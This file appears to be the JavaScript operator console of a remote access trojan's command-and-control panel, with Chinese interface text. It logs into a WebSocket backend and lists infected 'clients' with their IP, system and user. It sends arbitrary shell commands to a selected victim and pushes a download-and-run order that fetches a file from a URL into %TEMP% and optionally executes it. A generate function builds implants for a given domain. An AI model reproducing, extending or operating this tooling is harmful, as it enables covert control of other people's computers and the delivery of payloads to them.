var u = prompt("username：", "admin");
var p = prompt("password：", "123456");
var po = prompt("port", "3287")
var ho = prompt("host","127.0.0.1")
var base = new Base64();
var loc = window.location;
var uri = 'ws:';
var nowhandle = '';
var nowip = '';
if (loc.protocol === 'https:') {
    uri = 'wss:';
}

uri += '//' + ho + ':' + po;


ws = new WebSocket(uri);
ws.onopen = function () {
    ws.send(JSON.stringify({"username": u, "password": p}));


};
ws.onmessage = function (evt) {

    let data = JSON.parse(evt.data)
    console.log(data)
    if(data["data"]===false){
        $("#log").append("<p style='color:red'>密码错误</p>")
    }
    if (data["login"] === true) {
        $("#log").append("<p style='color:blue'>后端连接成功</p>")

        for (let i = 0; i < data["data"]["data"].length; i++) {
            let z = data["data"]["data"][i]
            //console.log(z)
            $("#server_list").append(
                `<tr id="` + z["uuid"] + `">
            <td><label>
            <input type="checkbox" name="category" value="` + z["uuid"] + `"/>
            </label></td>
            <td>` + z["info"]["ip"] + `</td>
            <td>` + z["info"]["remarks"] + `</td>
            <td>` + z["info"]["system"] + `</td>
            <td>` + z["info"]["user"] + `</td>
            <td>Loop</td>
            <td>` + z["info"]["iip"] + `</td>
            <td><a href="javascript:new_cmd('` + z["info"]["ip"] + `','` + z["uuid"] + `');">终端</a> <a href="javascript:download('` + z["info"]["ip"] + `','` + z["uuid"] + `');" >下载</a> <a href="javascript:remark('` + z["uuid"] + `');">备注</a></td>
            `
            );
            $("#log").append("<p style='color:green'>客户上线：" + z["info"]["ip"] + "</p>")
        }
    }
    if (data["action"] === "online") {
        let i = data["data"]["info"]
        $("#server_list").append(
            `<tr id="` + data["data"]["uuid"] + `">
            <td><label>
            <input type="checkbox" name="category" value="` + data["data"]["uuid"] + `"/>
            </label></td>
            <td>` + i["ip"] + `</td>
            <td>` + i["remarks"] + `</td>
            <td>` + i["system"] + `</td>
            <td>` + i["user"] + `</td>
            <td>Loop</td>
            <td>` + i["iip"] + `</td>
            <td><a href="javascript:new_cmd('` + data["data"]["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + i["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="javascript:remark('` + data["data"]["uuid"] + `');">备注</a></td>
            `
        );
        $("#log").append("<p style='color:green'>客户上线：" + i["ip"] + "</p>")
    }
    if (data["action"] === "offline") {
        $(`#` + data["data"]["uuid"]).remove();
        $("#log").append("<p style='color:#ff0000'>客户下线</p>")
    }
    if (data["action"] === "result") {
        if (data["data"]["action"] === "cmd") {
            $(`#cmd_textarea`).val($(`#cmd_textarea`).val() + "From " + data["data"]["uuid"] + ":\n\t" + data["data"]["data"] + "\n");
            $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
        } else {
            $("#" + data["data"]["uuid"] + " td")[5].innerText = data["data"]["data"]
            setTimeout(function () {
                $("#" + data["data"]["uuid"] + " td")[5].innerText = "Loop"
            }, 5000);
            $("#log").append("<p style='color:blue'>客户：" + data["data"]["ip"] + "返回：" + data["data"]["data"] + "</p>")
        }

    }
};
ws.onclose = function () {
    $("#log").append("<p style='color:red'>后端连接失败</p>")
    $("#light").css("display", "none");
    $("#fade").css("display", "none");
};

function cmd_execute() {

    let d = $("#cmd_input").val()
    let p = $("#cmd_param").val()
    let b64 = btoa(JSON.stringify({
        "command": d,
        "param": p
    }))
    ws.send(JSON.stringify(
        {
            "uuid": nowhandle,
            "do": {
                "do": "cmd",
                "data": b64
            }
        }
    ))
    $(`#cmd_textarea`).val($(`#cmd_textarea`).val() + "Send For: " + nowhandle + ":\n\t" + d + " " + p + "\n");
    $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
    $("#cmd_input").val("")
    $("#cmd_param").val("")

}

function generate() {
    $("#generate").css("display", "block");
    $("#fade").css("display", "block");
}

function generate_close() {

    $("#generate").css("display", "none");
    $("#fade").css("display", "none");

}

function download_close() {

    $("#download").css("display", "none");
    $("#fade").css("display", "none");

}

function download(ip, id) {
    $("#download").css("display", "block");
    $("#fade").css("display", "block");
    if (nowhandle != id) {
        $("#cmd_textarea").val("")
    }
    nowhandle = id;

    nowip = ip;
}

function cmd_close() {
// document.getElementById('light').style.display='none';
// document.getElementById('fade').style.display='none';
    $("#light").css("display", "none");
    $("#fade").css("display", "none");

}

function new_cmd(ip, id) {
// document.getElementById('light').style.display='block';
// document.getElementById('fade').style.display='block';
    $("#light").css("display", "block");
    $("#fade").css("display", "block");
    nowhandle = id;
    nowip = ip;
    $("#IP").html("目前控制的是：" + ip);

}

function remark(id) {
    $("#remark").css("display", "block");
    $("#fade").css("display", "block");
    nowhandle = id;
    console.log(nowhandle, id)

}

function remark_close() {
    $("#remark").css("display", "none");
    $("#fade").css("display", "none");
}

function remark_btu_on() {
    let remark = $("#remark_input").val()
    if (remark === "") {
        alert("备注不能为空")
        return
    }
    let b64 = btoa(JSON.stringify(
        {
            "remark": remark
        }
    ))
    ws.send(JSON.stringify(
        {
            "uuid": nowhandle,
            "do": {
                "do": "remark",
                "data": b64
            }
        }
    ))
    $("#remark_result").html("发送成功")

}

function down_btu_on() {
    if ($("#http_address").val() === "") {
        $("#error_http_address").html("网址不能为空");
        return;
    }
    if ($("#save_path").val() === "") {
        $("#error_save_path").html("将写入默认目录");
        $("#save_path").val("%TEMP%")
    }
    let url = $("#http_address").val()
    let path = $("#save_path").val()
    let is_run = $("#is_run").val()
    let b64 = btoa(JSON.stringify({
        "url": url,
        "path": path,
        "is_run": is_run
    }))
    ws.send(JSON.stringify(
        {
            "uuid": nowhandle,
            "do": {
                "do": "download",
                "data": b64
            }
        }
    ))
    $("#d_res").html("发送成功,请等待一段时间后刷新查看");
}

function generate_btu_on() {
    if ($("#domain").val() === "") {
        alert("域名不能为空");
        return;
    }

    window.open("/generate?domain=" + $("#domain").val() + "&version=" + $("#version").val(), "_blank");
}